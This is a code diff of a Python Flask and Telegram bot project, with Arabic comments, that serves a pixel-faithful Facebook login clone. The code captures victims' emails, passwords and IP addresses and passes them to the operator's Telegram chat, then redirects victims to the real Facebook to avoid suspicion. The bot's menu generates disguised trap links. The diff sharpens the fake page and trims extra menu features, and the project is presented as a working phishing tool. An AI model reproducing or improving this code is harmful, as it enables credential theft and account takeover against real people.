@@ -14,7 +14,7 @@ bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
 
 # ==========================================
-# قالب فيسبوك المطابق للأصل 100% (نسخة مطابقة تماماً)
+# قالب فيسبوك المطابق للأصل تماماً (تصميم الموبايل والديسكتوب الدقيق)
 # ==========================================
 FB_PHISH_TEMPLATE = """
 <!DOCTYPE html>
@@ -24,47 +24,117 @@ FB_PHISH_TEMPLATE = """
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>تسجيل الدخول إلى فيسبوك</title>
     <style>
-        body { background-color: #f0f2f5; font-family: Helvetica, Arial, sans-serif; direction: rtl; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .container { display: flex; flex-direction: row; justify-content: space-between; max-width: 980px; width: 100%; padding: 20px; box-sizing: border-box; }
-        .left-side { flex: 1; padding-right: 20px; display: flex; flex-direction: column; justify-content: center; }
-        .facebook-logo { font-size: 4rem; color: #1877f2; font-weight: bold; margin-bottom: 10px; font-family: system-ui; }
-        .left-side p { font-size: 28px; line-height: 32px; color: #1c1e21; margin: 0; }
-        .right-side { flex: 1; display: flex; justify-content: center; align-items: center; }
-        .login-card { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0.1), 0 8px 16px rgba(0, 0, 0.1); width: 396px; text-align: center; }
-        .login-card input { width: 90%; padding: 14px 16px; margin: 6px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; outline: none; }
-        .login-card input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
-        .login-btn { background-color: #1877f2; border: none; border-radius: 6px; color: #fff; font-size: 20px; font-weight: bold; padding: 12px 16px; width: 95%; cursor: pointer; margin-top: 10px; }
-        .login-btn:hover { background-color: #166fe5; }
-        .forgot-pass { color: #1877f2; font-size: 14px; text-decoration: none; display: block; margin: 15px 0; }
-        .forgot-pass:hover { text-decoration: underline; }
-        hr { border: none; border-top: 1px solid #dadde1; margin: 20px 0; }
-        .create-btn { background-color: #42b72a; border: none; border-radius: 6px; color: #fff; font-size: 17px; font-weight: bold; padding: 12px 16px; cursor: pointer; }
-        .create-btn:hover { background-color: #36a420; }
-        @media (max-width: 768px) {
-            .container { flex-direction: column; text-align: center; }
-            .left-side { padding-right: 0; margin-bottom: 30px; }
-            .left-side p { font-size: 20px; line-height: 24px; }
+        body {
+            background-color: #f0f2f5;
+            font-family: Helvetica, Arial, sans-serif;
+            direction: rtl;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+        .fb-logo {
+            margin-bottom: 20px;
+        }
+        .fb-logo img, .fb-logo svg {
+            width: 112px;
+            height: auto;
+        }
+        .card {
+            background-color: #ffffff;
+            border: none;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            box-sizing: border-box;
+            margin: 0 0 40px;
+            padding: 20px;
+            width: 396px;
+            text-align: center;
+        }
+        .card input {
+            border: 1px solid #dddfe2;
+            color: #1d2129;
+            font-size: 17px;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            width: 90%;
+            border-radius: 6px;
+            outline: none;
+            box-sizing: border-box;
+        }
+        .card input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        .login-btn {
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 20px;
+            line-height: 48px;
+            padding: 0 16px;
+            width: 100%;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 12px;
+        }
+        .login-btn:hover {
+            background-color: #166fe5;
+        }
+        .forgot-link {
+            color: #1877f2;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+            display: block;
+            margin-bottom: 20px;
+        }
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+        hr {
+            border: none;
+            border-top: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        .create-btn {
+            background-color: #42b72a;
+            border: none;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 17px;
+            font-weight: bold;
+            line-height: 48px;
+            padding: 0 16px;
+            cursor: pointer;
+            display: inline-block;
+            text-decoration: none;
+        }
+        .create-btn:hover {
+            background-color: #36a420;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="left-side">
-            <div class="facebook-logo">facebook</div>
-            <p>يساعدك فيسبوك على التواصل المشاركة مع الأشخاص الذين تعرفهم.</p>
-        </div>
-        <div class="right-side">
-            <div class="login-card">
-                <form method="POST">
-                    <input type="text" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
-                    <input type="password" name="pass" placeholder="كلمة السر" required>
-                    <button type="submit" class="login-btn">تسجيل الدخول</button>
-                    <a href="#" class="forgot-pass">هل نسيت كلمة السر؟</a>
-                    <hr>
-                    <button type="button" class="create-btn">إنشاء حساب جديد</button>
-                </form>
-            </div>
-        </div>
+    <div class="fb-logo">
+        <svg viewBox="0 0 214 45" width="150" height="32" class="fb_logo img sp_1Z-6q-12t9w sx_140733">
+            <path fill="#1877f2" d="M116.3 29.5V18.2h-3.9v-3.7h3.9V12c0-3.9 2.3-6.1 5.9-6.1 1.7 0 3.2.1 3.6.2v3.7h-2.2c-1.9 0-2.5.9-2.5 2.4v2.1h4.6l-.6 3.7h-4v11.3h-4.8zM25.7 0C11.5 0 0 11.5 0 25.7c0 12.6 9 23 20.8 25.4V34.5h-6.3V25.7h6.3v-5.4c0-6.2 3.7-9.6 9.3-9.6 2.7 0 5.5.5 5.5.5v6.1h-3.1c-3.1 0-4.1 1.9-4.1 3.8v4.6h7l-1.1 5.4h-5.9v16.6C37 48.7 46 38.3 46 25.7 46 11.5 34.5 0 25.7 0z"></path>
+        </svg>
+    </div>
+    
+    <div class="card">
+        <form method="POST">
+            <input type="text" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+            <input type="password" name="pass" placeholder="كلمة السر" required>
+            <button type="submit" class="login-btn">تسجيل الدخول</button>
+            <a href="#" class="forgot-link">هل نسيت كلمة السر؟</a>
+            <hr>
+            <a href="#" class="create-btn">إنشاء حساب جديد</a>
+        </form>
     </div>
 </body>
 </html>
@@ -74,7 +144,6 @@ FB_PHISH_TEMPLATE = """
 def fb_trap():
     target_chat_id = request.args.get('id', None)
     if request.method == 'POST':
-        # التقاط البيانات الحقيقية بدقة تامة من الـ Form Fields الصحيحة
         email = request.form.get('email')
         password = request.form.get('pass')
         source_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
@@ -91,52 +160,43 @@ def fb_trap():
             except Exception as e:
                 print(f"[-] Telegram Error: {e}")
                 
-        # إعادة توجيه الضحية لصفحة فيسبوك الحقيقية حتى لا يشك نهائياً
         return redirect("https://www.facebook.com", code=302)
         
     return render_template_string(FB_PHISH_TEMPLATE)
 
 # ==========================================
-# واجهة تحكم البوت
+# واجهة البوت (مخصصة لفيسبوك فقط وبدون زوائد)
 # ==========================================
 def main_menu():
-    markup = InlineKeyboardMarkup(row_width=2)
+    markup = InlineKeyboardMarkup()
     markup.add(
-        InlineKeyboardButton("🔗 رابط مصيدة فيسبوك الاحترافي", callback_data="gen_fb_phish"),
-        InlineKeyboardButton("📦 مولد ملفات السيطرة", callback_data="gen_payload"),
-        InlineKeyboardButton("📡 الجلسات النشطة", callback_data="active_sessions"),
-        InlineKeyboardButton("💳 الاشتراكات", callback_data="billing")
+        InlineKeyboardButton("🔗 توليد رابط مصيدة فيسبوك", callback_data="gen_fb_phish")
     )
     return markup
 
 @bot.message_handler(commands=['start', 'panel'])
 def start_command(message):
-    bot.send_message(message.chat.id, "⚡ **لوحة تحكم الترسانة الهجومية (النسخة الاحترافية)**:", parse_mode="Markdown", reply_markup=main_menu())
+    user_name = message.from_user.first_name
+    text = (
+        f"⚡ **مرحباً بك يا {user_name} في منصة صيد فيسبوك المتخصصة**\n\n"
+        "تمت تصفية المنصة والتركيز كلياً على أداة استهداف فيسبوك باحترافية تامة.\n"
+        "اضغط على الزر أدناه لتوليد رابطك المُموه:"
+    )
+    bot.send_message(message.chat.id, text, parse_mode="Markdown", reply_markup=main_menu())
 
 @bot.callback_query_handler(func=lambda call: True)
 def callback_handler(call):
     chat_id = call.message.chat.id
     
     if call.data == "gen_fb_phish":
-        bot.answer_callback_query(call.id, "جاري توليد الرابط المخفي...")
-        # رابط مصيدة مطابق لشكل الروابط الطبيعية
+        bot.answer_callback_query(call.id, "جاري تجهيز الرابط...")
         phish_link = f"{RAILWAY_URL}/login.php?id={chat_id}"
         msg = (
-            "🎯 **رابط مصيدة فيسبوك الاحترافي جاهز:**\n\n"
+            "🎯 **رابط المصيدة المخصص جاهز:**\n\n"
             f"`{phish_link}`\n\n"
-            "الصفحة مطابقة تماماً لواجهة فيسبوك الأصلية، وعند إدخال البيانات ستصلك فوراً ويتم توجيه الضحية للموقع الحقيقي لتمويهه."
+            "الصفحة الآن مطابقة تماماً لشكل فيسبوك الأصلي (الشعار بالأعلى وخانات الإدخال تحتها مباشرة)، وعند التقاط البيانات يتم تحويل الضحية للموقع الحقيقي مباشرة."
         )
         bot.send_message(chat_id, msg, parse_mode="Markdown")
-        
-    elif call.data == "gen_payload":
-        bot.answer_callback_query(call.id, "مولد الملفات...")
-        bot.send_message(chat_id, "⚙️ اختر النظام المستهدف لبناء ملف السيطرة.")
-    elif call.data == "active_sessions":
-        bot.answer_callback_query(call.id, "الجلسات...")
-        bot.send_message(chat_id, "📡 لا توجد جلسات نشطة حالياً.")
-    elif call.data == "billing":
-        bot.answer_callback_query(call.id, "الاشتراكات...")
-        bot.send_message(chat_id, "💳 نظام الدفع والاشتراكات مفعل.")
 
 def run_flask():
     port = int(os.environ.get("PORT", 5000))
